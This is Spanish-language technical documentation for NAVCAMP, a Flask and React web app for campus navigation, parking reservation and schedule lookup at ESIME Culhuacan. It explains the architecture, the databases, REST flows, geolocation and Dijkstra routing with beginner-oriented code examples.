# DOCUMENTACION TECNICA COMPLETA

# NAVCAMP

# SISTEMA DE NAVEGACION INTERACTIVA ESIME CULHUACAN

Proyecto de ingenieria desarrollado para la Escuela Superior de Ingenieria Mecanica y Electrica, Unidad Culhuacan, del Instituto Politecnico Nacional.

Version: 1.0
Fecha: Marzo 2026
Autores: Sosa Hernandez Omar Alejandro, Frias Rodriguez Adrian


# CAPITULO 1. INTRODUCCION AL PROYECTO

## 1.1 EL PROBLEMA QUE RESUELVE

La ESIME Culhuacan es un campus universitario con multiples edificios, laboratorios, areas deportivas y un estacionamiento dividido en varias secciones. Para un estudiante de nuevo ingreso, recorrer el campus por primera vez puede resultar confuso: no existe señalizacion digital, no hay una aplicacion que indique como llegar de un edificio a otro, y el estacionamiento opera sin ningun sistema de organizacion visible.

Este proyecto resuelve tres problemas concretos:

1. Navegacion dentro del campus. Un estudiante necesita llegar del edificio 1 al laboratorio de computo en el edificio 3. Actualmente, debe preguntar a otros alumnos o recorrer el campus hasta encontrarlo. Con este sistema, el estudiante abre la aplicacion, selecciona su destino y obtiene la ruta mas corta dibujada sobre un mapa real del campus. La ruta incluye la distancia en metros y el tiempo estimado caminando.

Para entender la importancia de este problema, consideremos un ejemplo concreto. Un alumno de primer semestre tiene clase de Calculo en el edificio 2, salon 205, a las 7:00 AM. A las 8:30 AM tiene laboratorio de Fisica en el edificio 4, planta baja. El alumno no conoce el campus. Sin este sistema, pierde entre 5 y 15 minutos buscando la ruta. Con este sistema, consulta la ruta en su telefono y llega en el tiempo optimo.

2. Gestion inteligente del estacionamiento. El estacionamiento cuenta con cientos de lugares distribuidos en cuatro secciones. No existe forma de saber si hay lugares disponibles sin recorrer fisicamente cada seccion. Un alumno puede pasar 20 minutos circulando por el estacionamiento buscando un lugar libre. Este sistema permite consultar en tiempo real la disponibilidad, reservar un lugar desde el telefono y marcar cuando se ocupa fisicamente.

Analogia: Imagina que llegas a un centro comercial y en la entrada hay una pantalla que muestra cuantos lugares hay disponibles en cada piso del estacionamiento. Ademas, puedes reservar uno desde tu telefono antes de llegar. Eso es exactamente lo que hace este sistema, pero para el campus escolar.

3. Consulta academica rapida. Un estudiante necesita saber en que salon tiene su proxima clase. En lugar de buscar en documentos impresos, puede consultar su horario directamente desde la aplicacion, ver el edificio correspondiente y trazar una ruta hacia el.

## 1.2 CONTEXTO DEL SISTEMA

El sistema es una aplicacion web compuesta por dos partes principales: un servidor backend construido con Flask (Python) que gestiona la logica de negocio, las bases de datos y las APIs, y un cliente frontend construido con React (JavaScript) que presenta la interfaz visual al usuario.

Para entender mejor la relacion entre estas dos partes, se puede utilizar la siguiente analogia:

Imagina un restaurante. La cocina es el backend: recibe pedidos, prepara la comida y la entrega. Nadie ve la cocina desde afuera. El comedor es el frontend: es donde el cliente se sienta, ve el menu, hace su pedido y consume lo que la cocina le entrega. El mesero que lleva los pedidos entre el comedor y la cocina es la API REST. El cliente nunca entra a la cocina directamente, y la cocina nunca sale al comedor. Se comunican exclusivamente a traves del mesero.

Llevando la analogia mas lejos:

- El menu del restaurante es como la interfaz de usuario (botones, formularios, mapas).
- El pedido que escribe el mesero en su libreta es como una peticion HTTP (un mensaje estructurado con datos).
- La receta que sigue el chef es como la logica de negocio (las reglas que el sistema aplica).
- La alacena y el refrigerador son como la base de datos (donde se guardan los ingredientes / los datos).
- El plato servido al cliente es como la respuesta JSON (los datos procesados que recibe el frontend).

En nuestro sistema:

- El frontend (React) es el comedor: muestra el mapa, los formularios de login, la pagina de estacionamiento.
- El backend (Flask) es la cocina: almacena usuarios, calcula rutas, gestiona reservas.
- La API REST es el mesero: transporta datos en formato JSON entre ambos.

Una diferencia clave con un restaurante real es que en software el "mesero" siempre espera a que el "comensal" le hable primero. El frontend siempre inicia la comunicacion; el backend nunca envia datos sin que se los pidan.

## 1.3 OBJETIVO DEL PROYECTO

Desarrollar una aplicacion web funcional que demuestre los siguientes conceptos de ingenieria de software:

- Arquitectura cliente-servidor con separacion clara de responsabilidades. Esto significa que el frontend y el backend son programas completamente independientes que podrian ejecutarse en computadoras diferentes.

- Diseno de APIs REST para comunicacion entre sistemas independientes. La API define un "contrato" que ambos lados respetan: el frontend sabe que si envia una peticion GET a /api/buildings, recibira una lista de edificios en formato JSON.

- Modelado de bases de datos relacionales con SQLAlchemy. Las bases de datos relacionales organizan la informacion en tablas con filas y columnas, donde las tablas pueden estar relacionadas entre si. Por ejemplo, la tabla de alumnos se relaciona con la tabla de grupos mediante una clave foranea.

- Algoritmos de grafos para calculo de rutas (Dijkstra). Un grafo es una estructura matematica que representa conexiones entre puntos. Los caminos del campus forman un grafo donde cada interseccion es un nodo y cada segmento de camino es una arista.

- Validacion de geolocalizacion para restricciones basadas en distancia. El sistema usa las coordenadas GPS del telefono del usuario para verificar que esta fisicamente cerca del estacionamiento antes de permitir ciertas acciones.

- Autenticacion de usuarios con hashing de contrasenas. Las contrasenas se almacenan de forma segura usando transformaciones matematicas unidireccionales (hashing) que hacen imposible recuperar la contrasena original a partir del dato almacenado.

- Patron de repositorio para abstraer el acceso a datos. Este patron separa la logica de "como buscar datos" de la logica de "que hacer con esos datos", permitiendo cambiar de base de datos sin reescribir la logica de negocio.

- Arquitectura de servicios para encapsular logica de negocio. Cada dominio del sistema (autenticacion, estacionamiento, rutas) tiene su propio servicio que concentra todas las reglas y validaciones.

## 1.4 PUBLICO OBJETIVO

Esta documentacion esta escrita para:

- Estudiantes de ingenieria que quieren entender como funciona un sistema web completo desde cero.
- Personas con conocimientos basicos de programacion que desean aprender Flask, React o arquitectura de software.
- Lectores que nunca han trabajado con Flask pero tienen experiencia basica con algun lenguaje de programacion.

La documentacion explica cada concepto desde sus fundamentos, incluyendo analogias, ejemplos de codigo real del proyecto y explicaciones linea por linea.

# CAPITULO 2. ARQUITECTURA DEL SISTEMA

## 2.1 QUE ES UNA ARQUITECTURA DE SOFTWARE

Antes de describir la arquitectura de este proyecto, es importante entender que significa "arquitectura de software". Asi como un edificio tiene planos que definen donde van las paredes, las puertas y las tuberias, un sistema de software tiene una arquitectura que define como se organizan sus componentes y como se comunican entre si.

Una buena arquitectura de software busca:

- Separacion de responsabilidades: cada componente hace UNA cosa y la hace bien.
- Bajo acoplamiento: los componentes pueden cambiar internamente sin afectar a los demas.
- Alta cohesion: las funciones relacionadas estan agrupadas en el mismo modulo.

Analogia: Piensa en una empresa. El departamento de ventas no deberia encargarse de la contabilidad, y el departamento de recursos humanos no deberia disenar los productos. Cada departamento tiene una responsabilidad clara. Si se cambia el software de contabilidad, no deberia afectar al departamento de ventas. Lo mismo aplica a los componentes de software.

## 2.2 ARQUITECTURA DE TRES CAPAS

El sistema sigue una arquitectura de tres capas, que es uno de los patrones mas utilizados en la industria del software:

Capa 1: Presentacion (Frontend)
Es todo lo que el usuario ve y con lo que interactua. Esta construida con React y se ejecuta en el navegador del usuario. Incluye paginas como el mapa interactivo, el formulario de login y la gestion de estacionamiento. Esta capa NO toma decisiones de negocio. Su unica responsabilidad es:
- Mostrar datos al usuario de forma visual.
- Capturar las acciones del usuario (clics, formularios, selecciones).
- Enviar esas acciones al backend.
- Mostrar las respuestas del backend.

Analogia: La capa de presentacion es como el panel de un cajero automatico. Muestra la pantalla, los botones, los mensajes. Pero el cajero no decide si tienes dinero suficiente para retirar; eso lo decide el sistema central del banco (la logica de negocio).

Capa 2: Logica de negocio (Backend)
Es donde ocurren las decisiones del sistema. Esta construida con Flask y se ejecuta en el servidor. Aqui se calcula si un usuario esta suficientemente cerca para ocupar un estacionamiento, se hashean las contrasenas, se calculan las rutas, y se validan los datos de entrada.

Las "reglas de negocio" son las restricciones y condiciones que el sistema debe cumplir. Ejemplos:
- "Un usuario solo puede tener un lugar de estacionamiento activo." Esta es una regla de negocio.
- "La contrasena debe tener al menos 6 caracteres." Esta es otra regla de negocio.
- "Para ocupar un lugar, debes estar a menos de 50 metros." Esta tambien es una regla de negocio.

Todas estas reglas viven en la capa de logica de negocio, NUNCA en el frontend. Si una regla se validara solo en el frontend, un atacante podria saltarla modificando el codigo JavaScript en su navegador.

Capa 3: Datos (Base de datos)
Es donde se almacena la informacion de forma permanente. Utiliza SQLite con dos bases de datos separadas: una para los datos del mapa (edificios, caminos, estacionamiento) y otra para los datos institucionales (alumnos, materias, horarios).

La capa de datos no conoce la logica de negocio. Su trabajo es simple: guardar datos y devolverlos cuando se los piden. Es como un archivero: puedes guardar carpetas y pedir que te las devuelvan, pero el archivero no decide que hacer con la informacion de las carpetas.

## 2.3 ARQUITECTURA DE BASES DE DATOS DUALES

Una decision arquitectonica fundamental de este proyecto es la separacion de las bases de datos en dos archivos independientes. Esta decision se tomo por una razon practica: si otra escuela quiere usar este sistema, puede conectar su propia base de datos de alumnos sin perder la configuracion del mapa del campus.

Base de datos MAP (map.db):
Contiene toda la informacion geografica y de infraestructura del campus.
- Edificios: nombre, coordenadas, tipo.
- Caminos: origen, destino, distancia.
- Secciones de estacionamiento: nombre, total de espacios.
- Espacios individuales: numero, estado, quien lo ocupa.
- Reservas: espacio, usuario, hora.
- Historial: registro de cambios de estado.
- Lugares guardados: favoritos del usuario en el mapa.

Esta base de datos es propiedad del sistema y no cambia aunque la escuela conecte un sistema externo.

Base de datos SCHOOL (school.db):
Contiene la informacion institucional.
- Alumnos: boleta, nombre, carrera, contrasena hasheada.
- Materias: nombre, clave.
- Profesores: nombre, departamento.
- Salones: edificio, numero.
- Grupos: clave del grupo (ejemplo: 1CV1).
- Horarios: materia, dia, hora, salon.
- Inscripciones: relacion alumno-grupo.

Esta base de datos es intercambiable. Si una escuela diferente quiere usar este sistema, puede conectar su propia base de datos (PostgreSQL, SQL Server, Azure SQL) sin afectar los datos del mapa.

Esta separacion se configura en SQLAlchemy mediante el sistema de binds:

```python
SQLALCHEMY_BINDS = {
    'map': 'sqlite:///map.db',
    'school': 'sqlite:///school.db',
}
```

Explicacion linea por linea:
- SQLALCHEMY_BINDS es un diccionario de Python que asocia nombres logicos con cadenas de conexion a bases de datos.
- La clave 'map' es un nombre que elegimos nosotros. Podria ser cualquier palabra.
- El valor 'sqlite:///map.db' es la cadena de conexion. sqlite:// indica el tipo de base de datos. Los tres slashes (///) significan que es una ruta relativa. map.db es el nombre del archivo.
- Lo mismo aplica para 'school' y 'sqlite:///school.db'.

Cada modelo de datos declara a que base de datos pertenece mediante el atributo __bind_key__:

```python
class EdificioDB(db.Model):
    __bind_key__ = 'map'    # Este modelo se guarda en map.db

class Alumno(db.Model):
    __bind_key__ = 'school'  # Este modelo se guarda en school.db
```

Cuando SQLAlchemy ejecuta una consulta sobre EdificioDB, automaticamente la dirige a map.db. Cuando ejecuta una consulta sobre Alumno, la dirige a school.db. El programador no necesita especificar la base de datos en cada consulta; el sistema lo determina a partir del __bind_key__ del modelo.

## 2.4 FLUJO DE INFORMACION DETALLADO

Cuando un usuario interactua con la aplicacion, los datos fluyen de la siguiente manera. Usaremos como ejemplo el proceso de hacer login:

Paso 1. El usuario escribe su boleta "2025350215" y contrasena "mipass123" en el formulario de Login.jsx y presiona "Ingresar".

Paso 2. React ejecuta la funcion handleBoletaLogin que llama a api.login(boleta, password). Esta funcion construye una peticion HTTP:
```
POST http://localhost:5001/auth/login
Content-Type: application/json

{"boleta": "2025350215", "password": "mipass123"}
```

Paso 3. La peticion viaja por la red local (localhost) desde el puerto 5173 (frontend) al puerto 5001 (backend).

Paso 4. Flask intercepta la peticion porque tiene un endpoint registrado para la URL /auth/login con metodo POST. Flask ejecuta la funcion login() asociada a ese endpoint.

Paso 5. La funcion login() extrae los datos JSON del cuerpo de la peticion usando request.get_json(). Esto convierte el texto JSON en un diccionario de Python:
```python
data = request.get_json()
# data es ahora: {'boleta': '2025350215', 'password': 'mipass123'}
```

Paso 6. El endpoint delega toda la logica a auth_service.login(data). El endpoint NO contiene logica de negocio; solo es un intermediario entre HTTP y el servicio.

Paso 7. AuthService valida el formato de la boleta, busca al usuario en la base de datos a traves del repositorio, verifica la contrasena contra el hash almacenado y retorna el resultado.

Paso 8. Flask empaqueta el resultado en una respuesta JSON:
```python
return jsonify(user), 200
# La respuesta HTTP sera:
# HTTP/1.1 200 OK
# Content-Type: application/json
# {"boleta": "2025350215", "nombre": "Sosa Hernandez Omar Alejandro", ...}
```

Paso 9. React recibe la respuesta, parsea el JSON y almacena los datos del usuario en localStorage para mantener la sesion:
```javascript
const user = await response.json();  // Convierte JSON a objeto JavaScript
localStorage.setItem('user', JSON.stringify(user));  // Guarda en almacenamiento local
navigate('/map');  // Redirige al mapa
```

Todo este proceso ocurre en menos de un segundo.

## 2.5 PATRON DE CAPAS EN EL BACKEND

El backend esta organizado internamente en capas con responsabilidades bien definidas. Cada capa solo se comunica con la capa inmediatamente inferior:

```
Peticion HTTP del navegador
    |
    v
 app.py (Endpoints / Controladores)
    |  Responsabilidad: Recibir HTTP, extraer datos, llamar servicio, retornar HTTP
    v
 services/ (Logica de negocio)
    |  Responsabilidad: Validar datos, aplicar reglas, coordinar operaciones
    v
 repositories/ (Acceso a datos)
    |  Responsabilidad: Ejecutar consultas a la base de datos
    v
 models/ (Definicion de tablas)
    |  Responsabilidad: Definir estructura de tablas y columnas
    v
 SQLite (Base de datos)
```

Analogia con una clinica medica:
- app.py es la recepcion: recibe al paciente, toma sus datos y lo dirige con el doctor correcto.
- services/ es el doctor: examina al paciente, decide el diagnostico y el tratamiento.
- repositories/ es el laboratorio: ejecuta los analisis que el doctor solicita y devuelve resultados.
- models/ es el formato de los expedientes: define que datos se registran de cada paciente.
- SQLite es el archivero: guarda fisicamente los expedientes.

La recepcion no diagnostica enfermedades (app.py no contiene logica de negocio). El doctor no guarda expedientes en el archivero directamente (los servicios no acceden a la base de datos sin pasar por los repositorios). El laboratorio no decide tratamientos (los repositorios no aplican reglas de negocio).

Esta separacion tiene beneficios concretos:
- Si se cambia de SQLite a PostgreSQL, solo se modifican los repositorios. Los servicios ni se enteran.
- Si se cambia una regla de negocio (por ejemplo, permitir 2 lugares de estacionamiento en vez de 1), solo se modifica el servicio. Los endpoints y repositorios no cambian.
- Si se agrega un nuevo endpoint (por ejemplo, una app movil), solo se agrega la ruta en app.py. La logica ya existe en los servicios.


# CAPITULO 3. TECNOLOGIAS UTILIZADAS

## 3.1 FLASK (BACKEND WEB)

### Que es Flask

Flask es un framework web para Python. Un framework es un conjunto de herramientas y convenciones que facilitan la construccion de aplicaciones. Para entenderlo mejor:

Python por si solo es un lenguaje de programacion de proposito general. Puede hacer calculos, manipular archivos, procesar texto, pero NO sabe como recibir peticiones HTTP de un navegador. Flask le da a Python esa capacidad.

Analogia: Python es como saber hablar espanol. Flask es como tener un telefono. Saber espanol te permite comunicarte, pero necesitas un telefono para que alguien te llame desde lejos. Flask convierte a Python en un servidor web que puede "atender llamadas" (peticiones HTTP) desde navegadores web.

### Como funciona Flask

Flask se clasifica como un micro-framework porque proporciona solo lo esencial:
- Un sistema de rutas (asociar URLs con funciones de Python).
- Manejo de peticiones HTTP (leer datos que envia el cliente).
- Generacion de respuestas HTTP (enviar datos al cliente).
- La capacidad de extenderse con librerias adicionales (como Flask-SQLAlchemy para bases de datos o Flask-Limiter para rate limiting).

A diferencia de frameworks mas grandes como Django, Flask no incluye sistema de autenticacion, panel de administracion ni ORM por defecto. Esto da total libertad para elegir las herramientas que mejor se adapten al proyecto.

### Ejemplo detallado de un endpoint

```python
@app.route("/api/buildings", methods=["GET"])
def get_buildings():
    buildings = EdificioDB.query.all()
    return jsonify([b.to_dict() for b in buildings])
```

Explicacion linea por linea:

Linea 1: @app.route("/api/buildings", methods=["GET"])
- El simbolo @ indica un decorador de Python. Un decorador es una funcion que modifica otra funcion.
- app.route() es un metodo de Flask que registra una URL.
- "/api/buildings" es la URL que activara esta funcion. Si alguien visita http://localhost:5001/api/buildings, Flask ejecutara la funcion que viene debajo.
- methods=["GET"] indica que esta funcion solo responde a peticiones GET (peticiones de lectura). Si alguien intenta hacer POST a esta URL, Flask retornara un error 405 (Method Not Allowed).

Linea 2: def get_buildings():
- Define una funcion normal de Python llamada get_buildings.
- El nombre de la funcion puede ser cualquiera, pero se recomienda que sea descriptivo.
- Flask llama a esta funcion automaticamente cuando recibe una peticion GET en la URL /api/buildings.

Linea 3: buildings = EdificioDB.query.all()
- EdificioDB es un modelo de SQLAlchemy que representa la tabla 'edificios' en la base de datos.
- .query es un atributo especial que SQLAlchemy agrega a todos los modelos. Permite hacer consultas.
- .all() ejecuta la consulta y retorna TODOS los registros de la tabla como una lista de objetos Python.
- Internamente, SQLAlchemy genera y ejecuta: SELECT * FROM edificios

Linea 4: return jsonify([b.to_dict() for b in buildings])
- Esta linea usa una "list comprehension" de Python. Es equivalente a:
```python
result = []
for b in buildings:
    result.append(b.to_dict())
return jsonify(result)
```
- b.to_dict() convierte cada objeto EdificioDB en un diccionario Python con sus datos.
- jsonify() convierte la lista de diccionarios en una respuesta HTTP con formato JSON y el header Content-Type: application/json.

El resultado que recibe el frontend es algo como:
```json
[
    {"id": 1, "nombre": "Edificio 1", "latitud": 19.329, "longitud": -99.111, "tipo": "academico"},
    {"id": 2, "nombre": "Edificio 2", "latitud": 19.330, "longitud": -99.112, "tipo": "academico"},
]
```

## 3.2 SQLITE (BASE DE DATOS)

### Que es una base de datos relacional

Una base de datos relacional organiza la informacion en tablas (como hojas de calculo de Excel). Cada tabla tiene columnas (tipos de datos) y filas (registros individuales).

Ejemplo de la tabla alumnos:

```
| id | boleta      | nombre                    | carrera | vehiculo |
|----|-------------|---------------------------|---------|----------|
| 1  | 2025350215  | Sosa Hernandez Omar       | ISC     | carro    |
| 2  | 2024351279  | Frias Rodriguez Adrian    | ISC     | ninguno  |
| 3  | 2025999888  | Garcia Lopez Maria        | ICE     | moto     |
```

Lo "relacional" significa que las tablas pueden estar conectadas entre si. Por ejemplo, la tabla alumnos tiene una columna id_grupo que apunta a la tabla grupos. Esto se llama "clave foranea" (foreign key).

### Que es SQLite

SQLite es un motor de base de datos relacional que almacena toda la informacion en un solo archivo. A diferencia de bases de datos como MySQL o PostgreSQL que requieren un servidor separado corriendo en segundo plano, SQLite se ejecuta directamente dentro del proceso de la aplicacion.

Analogia: MySQL o PostgreSQL son como un banco donde debes ir fisicamente a depositar o retirar dinero. Necesitas que el banco este abierto, que haya conexion, que el sistema este funcionando. SQLite es como una caja fuerte en tu propia casa. El archivo .db vive junto a tu codigo, se abre cuando tu aplicacion se inicia y se cierra cuando tu aplicacion se detiene. No necesitas instalar nada adicional.

Ventajas de SQLite para este proyecto:
- No requiere instalacion de software adicional. Python incluye soporte para SQLite de fabrica.
- El archivo de base de datos se puede copiar y mover facilmente. Si quieres llevar tu base de datos a otra computadora, simplemente copias el archivo .db.
- Es suficientemente rapido para una aplicacion escolar con decenas o cientos de usuarios.
- Es perfecto para desarrollo y proyectos academicos.

Limitaciones de SQLite:
- No soporta bien multiples usuarios escribiendo al mismo tiempo (concurrencia).
- No tiene sistema de usuarios ni permisos internos.
- Para aplicaciones con miles de usuarios simultaneos, es mejor usar PostgreSQL o MySQL.

El proyecto utiliza dos archivos SQLite:
- instance/map.db: Datos del mapa, edificios, caminos, estacionamiento.
- instance/school.db: Datos de alumnos, materias, horarios, inscripciones.

## 3.3 SQLALCHEMY (ORM)

### Que es un ORM

ORM significa Object-Relational Mapper (Mapeador Objeto-Relacional). Es una herramienta que permite interactuar con la base de datos usando objetos de Python en lugar de escribir consultas SQL directamente.

Analogia: Imagina que hablas espanol pero necesitas comunicarte con alguien que solo habla japones. Un ORM es como un traductor simultaneo: tu hablas en tu idioma (Python), el traductor convierte tus palabras al otro idioma (SQL), el receptor responde en su idioma (resultados SQL), y el traductor te devuelve la respuesta en tu idioma (objetos Python).

### Comparacion: Sin ORM vs Con ORM

Sin ORM (SQL directo), para buscar un alumno habria que escribir:

```python
import sqlite3

conn = sqlite3.connect('school.db')
cursor = conn.cursor()
cursor.execute("SELECT * FROM alumnos WHERE boleta = ?", ('2025350215',))
row = cursor.fetchone()
# row es una tupla: (1, '2025350215', None, 'Sosa Hernandez Omar', ...)
# Necesitas recordar que row[0] es id, row[1] es boleta, etc.
conn.close()
```

Con SQLAlchemy (ORM):

```python
alumno = Alumno.query.filter_by(boleta='2025350215').first()
# alumno es un objeto Python con atributos:
# alumno.id → 1
# alumno.boleta → '2025350215'
# alumno.nombre → 'Sosa Hernandez Omar'
# alumno.carrera → 'ISC'
```

La segunda version es mas corta, mas legible y mas segura. SQLAlchemy se encarga automaticamente de:
- Abrir y cerrar la conexion a la base de datos.
- Parametrizar las consultas (previniendo inyeccion SQL).
- Convertir los resultados SQL en objetos Python con atributos nombrados.
- Generar el SQL correcto para cualquier base de datos (SQLite, PostgreSQL, MySQL).

### Como se define un modelo

Un modelo es una clase de Python que representa una tabla de la base de datos:

```python
class Alumno(db.Model):
    __tablename__ = 'alumnos'       # Nombre de la tabla en SQL
    __bind_key__ = 'school'          # Base de datos donde vive

    id = db.Column(db.Integer, primary_key=True)         # Columna entera, clave primaria
    boleta = db.Column(db.String(20), unique=True)       # Texto de max 20 chars, unico
    nombre = db.Column(db.String(100), nullable=False)   # Texto de max 100 chars, obligatorio
    password_hash = db.Column(db.String(256), nullable=True)  # Texto opcional
```

Explicacion linea por linea:

- class Alumno(db.Model): Define una clase que hereda de db.Model. Al heredar de db.Model, SQLAlchemy sabe que esta clase representa una tabla.
- __tablename__ = 'alumnos': El nombre de la tabla en SQL sera "alumnos". Si no se especifica, SQLAlchemy usaria "alumno" (el nombre de la clase en minusculas).
- __bind_key__ = 'school': Esta tabla pertenece a la base de datos school.db.
- id = db.Column(db.Integer, primary_key=True): Crea una columna "id" de tipo entero que es la clave primaria. La clave primaria identifica de forma unica cada fila. SQLite la autoincrementara automaticamente.
- boleta = db.Column(db.String(20), unique=True): Crea una columna "boleta" de tipo texto con maximo 20 caracteres. unique=True significa que no puede haber dos alumnos con la misma boleta.
- nombre = db.Column(db.String(100), nullable=False): nullable=False significa que este campo es obligatorio. No se puede crear un alumno sin nombre.
- password_hash = db.Column(db.String(256), nullable=True): nullable=True (por defecto) significa que este campo puede estar vacio. Esto es necesario para usuarios migrados que aun no han creado contrasena.

## 3.4 REST API

### Que es una API

API significa Application Programming Interface (Interfaz de Programacion de Aplicaciones). Una API define como dos programas se comunican entre si.

Analogia: Un control remoto es una API entre tu y la television. El control remoto tiene botones definidos (subir volumen, cambiar canal, encender). Tu no necesitas saber como funciona internamente la television; solo necesitas saber que botones presionar. La API de nuestro backend funciona igual: el frontend no necesita saber como funciona la base de datos internamente; solo necesita saber que URLs llamar y que datos enviar.

### Que es REST

REST (Representational State Transfer) es un estilo arquitectonico para disenar APIs web. Define convenciones sobre como nombrar URLs, que metodos HTTP usar y como estructurar las respuestas.

Los metodos HTTP y su significado:

- GET: Obtener datos. No modifica nada en el servidor. Es como leer un libro: no cambias el libro al leerlo.
  Ejemplo: GET /api/buildings obtiene la lista de edificios.

- POST: Crear algo nuevo. Es como escribir una nueva pagina en un libro.
  Ejemplo: POST /auth/register crea un nuevo usuario.

- PUT: Actualizar algo existente. Es como editar una pagina ya escrita.
  Ejemplo: PUT /api/parking/spaces/5/status actualiza el estado de un espacio.

- DELETE: Eliminar algo. Es como arrancar una pagina del libro.
  Ejemplo: DELETE /api/saved-places/3 elimina un lugar guardado.

### Formato JSON

Los datos viajan entre frontend y backend en formato JSON (JavaScript Object Notation). JSON es un formato de texto ligero que usa la misma sintaxis que los objetos de JavaScript:

```json
{
    "boleta": "2025350215",
    "nombre": "Sosa Hernandez Omar Alejandro",
    "carrera": "Ingenieria en Computacion",
    "materias": [
        {"nombre": "Calculo I", "salon": "205"},
        {"nombre": "Fisica II", "salon": "301"}
    ]
}
```

JSON soporta los siguientes tipos de datos:
- Cadenas de texto (strings): "Hola mundo"
- Numeros: 42, 3.14
- Booleanos: true, false
- Nulos: null
- Arreglos (listas): [1, 2, 3]
- Objetos (diccionarios): {"clave": "valor"}

## 3.5 REACT (FRONTEND)

### Que es React

React es una libreria de JavaScript para construir interfaces de usuario. Fue creada por Facebook (Meta) en 2013 y es una de las tecnologias mas utilizadas en la industria para desarrollo web.

Analogia: HTML es como un lienzo en blanco donde dibujas elementos estaticos. React convierte ese lienzo en una pantalla interactiva donde los elementos cambian, aparecen y desaparecen en respuesta a las acciones del usuario, sin necesidad de recargar toda la pagina.

### Componentes

React funciona con el concepto de componentes. Un componente es una pieza reutilizable de interfaz que puede tener su propia logica y estado.

Analogia: Piensa en bloques de LEGO. Cada bloque tiene una forma y un color definido. Puedes combinar bloques para crear estructuras mas grandes. En React, cada componente es un bloque: un boton puede ser un componente, un formulario puede ser un componente que contiene varios componentes de campos de texto y botones, y una pagina completa puede ser un componente que contiene muchos sub-componentes.

En este proyecto, las paginas principales son componentes:

- Login.jsx: Formulario de inicio de sesion, registro y creacion de contrasena para usuarios migrados. Es el componente mas complejo del frontend con multiples estados y flujos.
- MapPage.jsx: Pagina principal con el mapa interactivo de Leaflet, marcadores de edificios y dibujo de rutas.
- Dashboard.jsx: Panel con horarios academicos, materias inscritas y datos del alumno.
- ParkingPage.jsx: Gestion completa del estacionamiento con visualizacion SVG de cajones individuales.

### Estado (State)

El estado es informacion que puede cambiar durante la vida del componente. Cuando el estado cambia, React automaticamente vuelve a dibujar la parte de la interfaz que depende de ese dato.

```jsx
const [boleta, setBoleta] = useState('');
```

Explicacion:
- useState('') es un "hook" de React que crea una variable de estado con valor inicial vacio ('').
- boleta es la variable de estado actual. Si boleta vale "2025350215", el campo de texto mostrara "2025350215".
- setBoleta es la funcion para cambiar el valor. Cuando el usuario escribe "2025", React llama setBoleta("2025"), y el campo de texto se actualiza automaticamente para mostrar "2025".

### JSX

React utiliza JSX, una sintaxis que combina JavaScript con HTML. JSX permite escribir estructuras visuales dentro de funciones de JavaScript:

```jsx
function Saludo({ nombre }) {
    return <h1>Bienvenido, {nombre}</h1>;
}
```

Las llaves {} dentro del JSX permiten insertar expresiones de JavaScript. En este ejemplo, si nombre vale "Omar", el resultado sera: <h1>Bienvenido, Omar</h1>.

## 3.6 GEOLOCALIZACION

### Como funciona el GPS en el navegador

La geolocalizacion permite conocer la ubicacion fisica del usuario mediante las coordenadas GPS de su dispositivo. El navegador web proporciona esta informacion a traves de la API navigator.geolocation.

Cuando un sitio web solicita la ubicacion, el navegador:
1. Muestra un dialogo al usuario pidiendo permiso.
2. Si el usuario acepta, el navegador obtiene las coordenadas del hardware GPS (en telefonos) o estima la ubicacion por WiFi/IP (en computadoras de escritorio).
3. Retorna un objeto con latitud y longitud en grados decimales.

```javascript
navigator.geolocation.getCurrentPosition(
    (position) => {
        const lat = position.coords.latitude;   // Ejemplo: 19.329500
        const lng = position.coords.longitude;  // Ejemplo: -99.111400
    },
    (error) => {
        console.error("No se pudo obtener la ubicacion:", error.message);
    }
);
```

### Formula de Haversine

La distancia entre dos puntos en la superficie de la Tierra no se puede calcular con la formula simple de distancia euclidiana (raiz cuadrada de la suma de los cuadrados) porque la Tierra es esferica. La formula de Haversine calcula la distancia sobre la superficie de una esfera:

```python
import math

def haversine_distance(coord1, coord2):
    R = 6371000  # Radio de la Tierra en metros
    lat1, lon1 = math.radians(coord1[0]), math.radians(coord1[1])
    lat2, lon2 = math.radians(coord2[0]), math.radians(coord2[1])
    dlat = lat2 - lat1          # Diferencia de latitudes en radianes
    dlon = lon2 - lon1          # Diferencia de longitudes en radianes
    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
    return R * c  # Resultado en metros
```

Explicacion matematica simplificada:
- Primero convierte las coordenadas de grados a radianes (la unidad que usan las funciones trigonometricas).
- Calcula las diferencias de latitud y longitud.
- Aplica la formula de Haversine que usa funciones seno y coseno para considerar la curvatura terrestre.
- Multiplica por el radio de la Tierra (6,371 km) para obtener la distancia en metros.

Ejemplo practico: Si el usuario esta en las coordenadas (19.329500, -99.111400) que es el centro del estacionamiento, y una seccion esta en (19.329415, -99.111664), la distancia sera aproximadamente 30 metros.

### Uso en el proyecto

En este proyecto, la geolocalizacion se utiliza tres formas:

1. Reserva de estacionamiento: El usuario debe estar a maximo 1,500 metros (1.5 km) del centro del estacionamiento para reservar. Esto permite reservar cuando se va camino a la escuela.

2. Ocupar un lugar: El usuario debe estar a maximo 50 metros de la seccion especifica del estacionamiento. Esto asegura que esta fisicamente presente en esa seccion.

3. Navegacion: El usuario puede usar su ubicacion actual como punto de partida para trazar una ruta hacia un edificio.

## 3.7 NETWORKX Y ALGORITMO DE DIJKSTRA

### Teoria de grafos

Un grafo es una estructura matematica compuesta por nodos (vertices) y aristas (edges). Los nodos representan puntos y las aristas representan conexiones entre esos puntos.

Analogia: Piensa en un mapa del metro. Cada estacion es un nodo. Cada linea que conecta dos estaciones es una arista. Si quieres ir de Pantitlan a Chabacano, necesitas encontrar la mejor ruta a traves del grafo del metro.

En este proyecto, los caminos del campus forman un grafo donde:
- Cada interseccion o punto del camino es un nodo con coordenadas (latitud, longitud).
- Cada segmento de camino entre dos puntos es una arista con un peso (la distancia en metros entre esos dos puntos).

El grafo del campus tiene aproximadamente 431 nodos, lo que significa que el archivo KML contiene 431 puntos de referencia a lo largo de los caminos.

### Algoritmo de Dijkstra

El algoritmo de Dijkstra encuentra la ruta mas corta entre dos nodos de un grafo. Funciona de la siguiente manera:

1. Marca todos los nodos como "no visitados". Asigna distancia infinita a todos excepto al nodo de inicio (distancia 0).
2. Selecciona el nodo no visitado con la menor distancia acumulada.
3. Para cada vecino de ese nodo, calcula la distancia total pasando por el nodo actual.
4. Si esa distancia es menor que la distancia previamente registrada para el vecino, actualiza la distancia.
5. Marca el nodo actual como "visitado".
